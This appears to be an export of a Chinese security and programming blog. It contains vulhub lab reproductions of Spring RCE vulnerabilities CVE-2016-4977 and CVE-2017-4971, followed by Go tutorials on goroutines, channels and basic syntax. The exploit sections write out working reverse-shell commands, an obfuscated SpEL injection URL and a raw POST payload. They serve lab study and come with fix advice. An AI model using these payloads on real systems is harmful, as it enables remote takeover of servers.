构造反弹shell命令（攻击机的IP地址）\n1 2 3 bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.197.129/4444 0\u0026gt;\u0026amp;1 nc -lvnp 4444 使用在线编码对命令进行编码：\n1 https://forum.ywhack.com/shell.php 1 bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjkvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i} 然后使用POC，将命令再次编码：\n1 ${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))} 构造终极POC\n1 http://192.168.197.140:8080/oauth/authorize?response_type=上面的那一长串POC\u0026amp;client_id=acme\u0026amp;scope=openid\u0026amp;redirect_uri=http://test 访问链接\n1 http://192.168.197.140:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}\u0026amp;client_id=acme\u0026amp;scope=openid\u0026amp;redirect_uri=http://test 访问链接后，可以看出，成功反弹shell。\n修复建议 1. 使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel视图\n2. 使用2.0.x版本的用户升级到2.0.10以及更高的版本\n","date":"2025-09-08T00:00:00Z","image":"http://localhost:1313/images/52.webp","permalink":"http://localhost:1313/p/spring-boot%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2016-4977/","title":"【Spring Boot】远程命令执行漏洞（CVE-2016-4977）"},{"content":"漏洞简介 Spring Web Flow是Spring的一个子项目 ， 主要目 的是解决跨越多个请求的、 用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。\n在其 2.4.x版本中， 如果我们控制了数据绑定时的field， 将导致一个SpEL表达式注入漏洞，从而造成任意命令执行。\n影响版本 Spring Web Flow 2.4.0 - 2.4.4\n触发漏洞需要的两个条件 1 2 3 1.MvcViewFactoryCreator对象的 useSpringBeanBinding参数需要设置为 false（默认值） 2.flow view对象中设置 BinderConfiguration对象为空 环境搭建 1 2 root@ubuntu:/mnt/vulhub/spring# cd CVE-2017-4971/ root@ubuntu:/mnt/vulhub/spring/CVE-2017-4971# docker-compose up -d 复现过程 点击Login，可以看大账号/密码，这里我们随便选择一个进行登录。\n1 2 3 4 keith/melbourne erwin/leuven jeremy/atlanta scott/rochester 访问id为1的酒店，点击”Book Hotel“预定按钮。\n填写一些数据，点击Proceed按钮。\n1234567912312312\n在点击Confirm的时候进行抓包，此处存在命令执行，可反弹shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 POST /hotels/booking?execution=e2s2 HTTP/1.1 Host: 192.168.197.140:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 173 Origin: http://192.168.197.140:8080 Connection: keep-alive Referer: http://192.168.197.140:8080/hotels/booking?execution=e2s2 Cookie: JSESSIONID=4652D2318569E57A87C35C86F4391EDD Upgrade-Insecure-Requests: 1 Priority: u=0, i _eventId_confirm=\u0026amp;_csrf=9285d191-3a38-4790-a4e0-8862b1bde6c6\u0026amp;_(new+java.lang.ProcessBuilder(\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;bash+-i+\u0026gt;%26+/dev/tcp/192.168.197.129/10086+0\u0026gt;%261\u0026#34;)).start()=vulhub 反弹Shell代码：\n1 \u0026amp;_(new+java.lang.ProcessBuilder(\u0026#34;bash\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;bash+-i+\u0026gt;%26+/dev/tcp/192.168.197.129/10086+0\u0026gt;%261\u0026#34;)).start()=vulhub EXP拓展 执行命令\n1 2 3 \u0026amp;amp;_T(java.lang.Runtime).getRuntime().exec(\u0026#34;touch /tmp/success\u0026#34;) 或者 \u0026amp;amp;_(new+java.lang.ProcessBuilder(\u0026#34;touch /tmp/success2\u0026#34;)).start()=test ","date":"2025-09-08T00:00:00Z","image":"http://localhost:1313/images/53.webp","permalink":"http://localhost:1313/p/spring-web%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2017-4971/","title":"【Spring Web】框架远程代码执行（CVE-2017-4971）"},{"content":"0x01 协程 什么是进程、线程、协程？？？？？？？？\n概念 进程概念：\n1 进程（Process）是操作系统中运⾏中的程序，它是程序执⾏的⼀个实例。当你运⾏⼀个应⽤程序时，⽐如打开浏览器、启动游戏，操作系统会为这个程序创建⼀个进程。进程包含了程序执⾏的所有必要信息，例如代码、数据、资源和内存。 线程概念：\n1 线程是比进程更轻量的执⾏单元，是进程的⼀部分。⼀个进程可以包含多个线程，每个线程可以独⽴执⾏任务，但它们共享相同的内存空间和资源。 举例：\n1 2 3 4 5 进程就像⼀个厨房，⾥⾯有完整的设备、材料和⻝谱，允许你做饭。⽽线程则是厨房⾥的厨师。⼀个厨房可以有多个厨师（线程），每个厨师可以同时进⾏不同的任务（切菜、炒菜、煮汤等），并且他们共享同样的厨房资源，⽐如锅、灶台和⻝材。 单线程 如果是单线程的状态下，⼀个厨师(线程)就需要处理⼀整个厨房的事情(进程)，有⼀个⼤菜，厨师只能⼀个⼀个来弄，效率低下 多线程 ⼀个厨房有多个厨师，他们的效率就会更⾼，每个厨师可以同时进⾏不同的任务，并且因为他们是在⼀个厨房⾥(进程），他们可以直接沟通，(共享的数据结构进⾏通信),⽽进程是独⽴的厨房，两个厨房(进程)之间的通信，相对于来说要复杂很多。 协程概念：\n1 2 3 协程 Coroutines 是⼀种⽐线程更加轻量级的微线程。⼀个进程可以拥有多个线程，⼀个线程也可以拥有多个协程，因此协程⼜称微线程和纤程。 可以粗略的把协程理解成⼦程序调⽤，每个⼦程序都可以在⼀个单独的协程内执⾏。 Go协程⽐传统的操作系统线程更轻量级。它们的启动和销毁开销⾮常⼩，并且允许并发地执⾏代码，这意味着多个协程可以在同⼀时间段内运⾏,协程相当于是⼀个⼦程序，他属于⽤户态，也就是由语⾔来操作，线程与进程，都是属于内核态，由操作系统来操作，⽆法⼲预，但是协程，我们可以控制它。 调度器\n线程调度\n1 线程调度通常由操作系统的内核负责，是⼀种抢占式调度机制。抢占式调度意味着操作系统会强制地决定何时停⽌⼀个线程的执⾏，并切换到另⼀个线程。这种调度机制称为抢占式多任务，由于抢占式多任务，操作系统会根据线程的优先级、状态（如阻塞、就绪、运⾏）以及可⽤资源来决定哪个线程获得CPU时间⽚。每个线程在操作系统中都会分配⼀个时间⽚，当时间⽚⽤完时，操作系统会切换到另⼀个线程，在⼀个CPU时间⽚⽤完时，需要进⾏上下⽂切换，操作系统在线程之间切换时，需要保存和恢复线程的上下⽂（包括寄存器状态、程序计数器、内存⻚表等）。这种上下⽂切换发⽣在内核态和⽤户态之间，开销较⼤。但由于抢占式调度，操作系统会随时中断正在运⾏的线程，以便处理其他线程的任务，线程本身对调度过程没有控制权。 Go Goroutines 调度器\n1 2 协程调度通常是由编程语⾔的运⾏时（⽤户态）来负责，在go中，由Goroutines负责，Goroutines 的调度由 Go 的运⾏时系统（runtime）管理，通过协作式调度和抢占式调度结 合的⽅式，来保证 Goroutines 在多核 CPU 上⾼效执⾏。 Go调度的优势\n轻量性：\n1 相⽐于传统的操作系统线程，Goroutines 是⾮常轻量的。操作系统线程通常需要消耗⼤量内存（每个线程的栈⼤⼩默认⼏乎占 1-2 MB），⽽ Goroutine 的初始栈⼤⼩只有 2 KB，并且可以按需动态增⻓，这使得在同样的资源下，Go 程序可以轻松创建成千上万的 Goroutines ⽽不会占⽤过多系统资源。 ⾃动调度：\n1 Goroutines 不需要程序员⼿动管理。Go 的调度器会根据负载和系统资源⾃动进⾏调度，使得程序员能够专注于业务逻辑，⽽⽆需担⼼如何调度 Goroutines。 多核优化：\n1 Goroutines 的调度器充分利⽤了多核 CPU。Go 的运⾏时调度器通过逻辑处理器 P 和操作系统线程 M 的绑定机制，能够在多核 CPU 上⾃动并⾏执⾏ Goroutines，最⼤化性能。 协程的使用 协程创建\n1 2 3 Golang中的并发是函数相互独⽴运⾏的能⼒， 创建协程在任务函数前⾯加上go关键字： go test() 示例代码：\n先演示一下正常情况下的方法使用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import \u0026#34;fmt\u0026#34; func show(msg string) { for i := 0; i \u0026lt; 5; i++ { fmt.Println(msg) }} func main() { show(\u0026#34;go\u0026#34;) show(\u0026#34;java\u0026#34;) } 输出：正常打印5次go和5次java go go go go go java java java java java 创建协程的方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package main import ( \u0026#34;fmt\u0026#34; ) func show(msg string) { for i := 0; i \u0026lt; 5; i++ { fmt.Println(msg) //time.Sleep(100 * time.Millisecond) //每次循环，睡100毫秒 } } func main() { go show(\u0026#34;go\u0026#34;) //协程 show(\u0026#34;java\u0026#34;) //主线程 } 输出： java java java java java 一般会挤进来一次go，但次数很少 0x02 通道 概念 1 Go 提供了⼀种称为通道的机制，⽤于在 goroutine 之间共享数据。当 goroutine 执⾏并发活动时，需要在goroutine 之间共享资源或数据，通道充当 goroutine 之间的管道（管道）并提供⼀种机制来保证同步交换。 1 Channels 需要在声明通道时指定数据类型。我们可以共享内置、命名、结构和引⽤类型的值和指针。数据在通道上传递：在任何给定时间只有⼀个 goroutine 可以访问数据项：因此按照设计不会发⽣数据竞争。根据数据交换的⾏为，有两种类型的通道：⽆缓冲通道和缓冲通道。⽆缓冲通道⽤于执⾏goroutine 之间的同步通信，⽽缓冲通道⽤于执⾏异步通信。⽆缓冲通道保证在发送和接收发⽣的瞬间执⾏两个 goroutine 之间的交换。缓冲通道没有这样的保证。 1 协程之间⽆法直接通信，但可以使⽤通道来使协程之间互相通信通道分为有缓冲和⽆缓冲，有缓冲，容量设置后，可以异步读取数据，不会堵塞，⽆缓冲的话，放⼀个数据就必须取出来，否则就会阻塞。 创建⽆缓冲和缓冲通道\n1 2 3 make(chan int) //整型⽆缓冲通道，写入和读取同步进行，容易死锁，通常用于同步执行 make(chan int ,10) //整型有缓冲通道，通常用于异步执行。 使⽤内置函数make创建⽆缓冲、缓冲通道，make第⼀个参数需要是关键字chan，也就是通道Channels的缩写，然后是通道交换的数据类型\n使用 管道在左边，则说明是往管道中传输数据，管道在右边，则说明要取出数据\n1 2 3 4 5 ch := make(chan int,5) //整型缓冲通道 ch \u0026lt;- 5 //通过管道发送值 data := \u0026lt;-ch ⽆缓冲区实例\n阻塞+主协程结束\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;fmt\u0026#34; ) func main() { ch := make(chan int) //创建一个int类型的管道 go func() { //创建一个协程 fmt.Println(\u0026#34;准备向⽆缓冲通道发送数据\u0026#34;) ch \u0026lt;- 111 //往管道里添加一个111数据 fmt.Println(\u0026#34;向⽆缓冲通道发送数据完毕\u0026#34;) }() //time.Sleep(1 * time.Second) fmt.Println(\u0026#34;准备从⽆缓冲通道接收数据\u0026#34;) data := \u0026lt;-ch fmt.Println(\u0026#34;从⽆缓冲通道接收到数据：\u0026#34;, data) } 输出： 准备从⽆缓冲通道接收数据 准备向⽆缓冲通道发送数据 向⽆缓冲通道发送数据完毕 从⽆缓冲通道接收到数据： 111 缓冲区实例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34;) func main() { ch := make(chan int, 1) go func() { fmt.Println(\u0026#34;准备向⽆缓冲通道发送数据\u0026#34;) ch \u0026lt;- 111 fmt.Println(\u0026#34;向⽆缓冲通道发送数据完毕\u0026#34;) }() time.Sleep(10 * time.Second) fmt.Println(\u0026#34;准备从⽆缓冲通道接收数据\u0026#34;) data := \u0026lt;-ch fmt.Println(\u0026#34;从⽆缓冲通道接收到数据：\\n\u0026#34;, data) } 输出： 准备向⽆缓冲通道发送数据 向⽆缓冲通道发送数据完毕 准备从⽆缓冲通道接收数据 从⽆缓冲通道接收到数据： 111 实例1\n这个实例代码创建了⼀个通道 ch，在 main 函数中启动⼀个 goroutine 执⾏ Ion 函数，Ion 函数⽣成⼀个随机数并发送到通道，main 函数等待接收通道中的数据并打印，最后关闭通道。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) var ch = make(chan int) func Ion() { rand.Seed(time.Now().UnixNano()) intn := rand.Intn(100) fmt.Println(\u0026#34;随机数为：\u0026#34;, intn) time.Sleep(5 * time.Second) ch \u0026lt;- intn } func main() { defer close(ch) //main关闭后，关闭通道 go Ion() fmt.Println(\u0026#34;Wait...\u0026#34;) data := \u0026lt;-ch fmt.Println(\u0026#34;值为：\u0026#34;, data) fmt.Println(\u0026#34;Done\u0026#34;) } 输出： Wait... 随机数为： 76 值为： 76 Done ","date":"2025-09-06T00:00:00Z","image":"http://localhost:1313/images/51.webp","permalink":"http://localhost:1313/p/go%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/","title":"【GO】并发编程"},{"content":"0x01 认识函数 语法最基础函数：\n1 2 3 4 5 6 7 package main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(\u0026#34;hello world\u0026#34;) } 1. package 1 包是Go语⾔的基本组成单元，通常使⽤单个的⼩写单词命名，⼀个 Go 程序本质上就是⼀组包的集合。所有Go代码都有⾃⼰⾪属的包。main 包在Go中是⼀个特殊的包,整个Go程序中仅允许存在⼀个名为 main 的包。 函数：\n1 Go 语⾔中，函数名的⾸字⺟决定了其可⻅性。如果函数名的⾸字⺟⼤写，那么该函数是导出的，可以在包外部使⽤；如果⾸字⺟⼩写，那么该函数是未导出的，只能在包内部使⽤。 0x02 基本类型 字符串 Strings 单引号跟双引号的区别\n单引号:\n1 2 ⽤途：⽤于表示字符（rune）类型。 类型：字符类型在Go中是rune，它是int32的别名，可以表示⼀个Unicode码点 双引号:\n1 2 ⽤途：⽤于表示字符串（string）类型。 类型：字符串类型在Go中是string，它是⼀个字符序列，可以包含零个或多个字符 数字 Numbers 1 2 3 int uint uint32 不做太多解释。\n布尔值 Booleans 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package main import \u0026#34;fmt\u0026#34; func main() { fmt.Println(true \u0026amp;\u0026amp; true) fmt.Println(true \u0026amp;\u0026amp; false) fmt.Println(true || true) fmt.Println(true || false) fmt.Println(!true) } 输出： true false true true false 0x03 变量声明 变量声明：\n1 2 var s1 string s1 = \u0026#34;hello\u0026#34; 简短声明：\n1 s2 := \u0026#34;hell0\u0026#34; 一次声明多个变量：\n1 2 var s3,s4 string s5,s6 :=\u0026#34;G\u0026#34;,\u0026#34;o\u0026#34; 匿名变量：\n1 _, s7 := \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34; 0x04 注释 1 2 单行注释：// 多行注释：/* */ 0x05 fmt.Println与print 使⽤场景:\n1 2 fmt.Println:更常⽤于实际开发中，功能更强⼤，输出格式更灵活。 println:通常⽤于简单的调试或测试。 0x06 运算符 算术运算符:\n+（加法）\n1 a := 5 + 3 -（减法）\n1 a := 5 - 3 乘法\n1 a := 5 * 3 /（除法）\n1 a := 5 * 3 %（取模）\n1 a := 5 % 3 赋值运算符:\n=（赋值）\n1 a = 5 // 将5赋值给a +=（加赋值）\n1 2 a := 5 a += 3 // 等价于a = a + 3，结果是8 -=（减赋值）\n1 2 a := 5 a -= 3 // 等价于a = a - 3，结果是2 *= (乘赋值)\n1 2 a := 5 a *= 3 // 等价于a = a * 3，结果是15 /= (除赋值)\n1 2 a := 6 a /= 3 // 等价于a = a / 3，结果是2 %= (取模赋值)\n1 2 a := 5 a %= 3 // 等价于a = a % 3，结果是2 关系运算符\n== （等于）\n1 2 3 a := 5 b := 5 fmt.Println(a == b) // 结果是true !=（不等于）\n1 2 3 a := 5 b := 3 fmt.Println(a != b) // 结果是true \u0026lt;（⼩于）\n1 2 3 a := 3 b := 5 fmt.Println(a \u0026lt; b) // 结果是true \u0026lt;=（⼩于等于）\n1 2 3 a := 5 b := 5 fmt.Println(a \u0026lt;= b) // 结果是true \u0026lsquo;\u0026gt;\u0026rsquo;（⼤于）\n1 2 3 a := 5 b := 3 fmt.Println(a \u0026gt; b) // 结果是true （⼤于等于）\n1 2 3 a := 5 b := 5 fmt.Println(a \u0026gt;= b) // 结果是true 逻辑运算符\n\u0026amp;\u0026amp;（逻辑与）\n1 2 3 a := true b := false fmt.Println(a \u0026amp;\u0026amp; b) // 结果是false ||（逻辑或）\n1 2 3 a := true b := false fmt.Println(a || b) // 结果是true !（逻辑⾮）\n1 2 a := true fmt.Println(!a) // 结果是false 位运算符\n\u0026amp;（按位与）\n1 2 3 a := 5 // 0101 b := 3 // 0011 fmt.Println(a \u0026amp; b) // 结果是1（0001） |（按位或）\n1 2 3 a := 5 // 0101 b := 3 // 0011 fmt.Println(a | b) // 结果是7（0111） ^（按位异或）\n1 2 3 4 5 如果两个数的对应位只有⼀个是 1，那么结果位为 1。 如果两个数的对应位都是 1 或都是 0，那么结果位为 0。 a := 5 // 0101 b := 3 // 0011 fmt.Println(a ^ b) // 结果是6（0110） \u0026laquo;（左移） 保留0\n1 2 a := 1 // 0001 fmt.Println(a \u0026lt;\u0026lt; 2) // 结果是4（0100） 》》(右移）不保留0\n1 2 a := 4 // 0100 fmt.Println(a \u0026gt;\u0026gt; 2) // 结果是1（0001） 复合赋值运算符\n\u0026amp;=（按位与赋值）\n1 2 a := 5 // 0101 a \u0026amp;= 3 // 结果是1（0001） |=（按位或赋值）\n1 2 a := 5 // 0101 a |= 3 // 结果是7（0111） ^=（按位异或赋值）\n1 2 a := 5 // 0101 a ^= 3 // 结果是6（0110） 其它运算符\n++（⾃增）\n1 2 a := 5 a++ // 结果是6 \u0026ndash;（⾃减）\n1 2 a := 5 a-- // 结果是4 :=（短变量声明）\n1 a := 5 // 声明并初始化变量a \u0026lt;-（通道操作符）\n1 2 3 4 5 6 ch := make(chan int) go func() { ch \u0026lt;- 5 // 发送值到通道 }() a := \u0026lt;-ch // 从通道接收值 fmt.Println(a) // 结果是5 分组和分隔符\n( 和 )（⼩括号）\n1 a := (5 + 3) * 2 // ⼩括号⽤于改变运算优先级 [ 和 ]（中括号）\n1 2 arr := [3]int{1, 2, 3} // 定义数组 fmt.Println(arr[0]) // 访问数组元素，结果是1 { 和 }（⼤括号）\n1 2 3 4 5 func main() { fmt.Println(\u0026#34;Hello, World!\u0026#34;) } ,（逗号）\n1 a, b := 1, 2 // 多变量声明 ;（分号）\n1 2 3 // Go语⾔中分号通常是隐式的，但可以显式使⽤ a := 5; b := 3; fmt.Println(a + b) \u0026hellip;（省略号）\n1 2 3 4 5 6 7 8 func sum(nums ...int) int { total := 0 for _, num := range nums { total += num } return total } fmt.Println(sum(1, 2, 3)) // 结果是6 .（点号）\n1 fmt.Println(\u0026#34;Hello, World!\u0026#34;) // 调⽤包中的函数 快捷键\n1 2 3 4 Ctrl+B 转到声明 Ctrl+p 查看这个函数可以接收什么内容 .var 快速⽣成变量名 shift+空格 下⼀⾏ 小坑：\n1 2 3 创建项⽬记得⽤英⽂，不能⽤中⽂创建项⽬ ⽆法相互调⽤，看看是不是mod包错了 0x07 常量声明 常量定义 1 2 常量使⽤ const 关键字定义。 常量的值在编译时就确定了，不能在运⾏时改变。 常量类型 1 2 常量可以是布尔型、数字型（整数、浮点数、复数）、字符串型。 常量的类型可以是显式声明的，也可以是隐式的。 例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import \u0026#34;fmt\u0026#34; func main() { var s1 int = 10 //变量举例，可以动态改变 fmt.Println(s1) //输出10 s1 = 20 fmt.Println(s1) //输出20 const s2 = 10 //常量举例，不可以被改变 fmt.Println(s2) //输出10 s2 = 20 //不能被修改，这里运行错误 fmt.Println(s2) } 多个常量的分组声明 可以使用consts进行声明：\n多行进行声明：\n1 2 3 4 const ( q int = 10 w string = \u0026#34;hello\u0026#34; ) var也可以进行多行声明：\n⽆类型常量声明 ⽆类型常量在需要时会被隐式转换为适当的类型\n1 2 3 func main() { const pi = 3.1415926 } iota 枚举 1 2 iota 是⼀个常量⽣成器，⽤于⽣成⼀系列相关值。 iota 在每个 const 声明块中从 0 开始，逐⾏递增。 示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import \u0026#34;fmt\u0026#34; const ( pi = 3.1415926 Language = \u0026#34;Go\u0026#34; IsTrue = true ) const ( Zero = iota One Two ) func main() { fmt.Println(\u0026#34;Pi:\u0026#34;, pi) fmt.Println(\u0026#34;Language:\u0026#34;, Language) fmt.Println(\u0026#34;IsTrue:\u0026#34;, IsTrue) fmt.Println(\u0026#34;Zero:\u0026#34;, Zero) fmt.Println(\u0026#34;One:\u0026#34;, One) fmt.Println(\u0026#34;Two:\u0026#34;, Two) } 输出： Pi: 3.1415926 Language: Go IsTrue: true Zero: 0 One: 1 Two: 2 变量与常量的区别 1 2 3 4 定义⽅式：常量使⽤ const，变量使⽤ var 或 :=。 值的修改：常量不可修改，变量可修改。 内存分配：常量在编译时确定，不占⽤运⾏时内存；变量在运⾏时分配内存。 使⽤场景：常量⽤于定义不会改变的值，变量⽤于定义可能会改变的值。 0x08 数组 1.什么是数组？ 在 Go 中，数组是具有固定⻓度且元素类型相同的集合。数组的定义语法如下：\n1 2 var arrayName [length]elementType var numbers [5]int 2.初始化数组 数组可以在声明时进⾏初始化\n1 2 3 4 5 func main() { var number = [5]int{1, 2, 3, 4, 5} fmt.Println(number) } 输出：[1 2 3 4 5] 3.简短声明⽅式 1 2 3 4 5 func main() { numbers := [5]int{1, 2, 3, 4, 5} fmt.Println(numbers) } 输出：[1 2 3 4 5] 4.使⽤省略让编译器⾃动计算数组⻓度 1 2 3 4 5 func main() { numbers := [...]int{1, 2, 3, 4, 5} fmt.Println(numbers) } 输出：[1 2 3 4 5] 5.访问数组元素 1 2 3 4 5 func main() { numbers := [...]int{1, 2, 3, 4, 5} 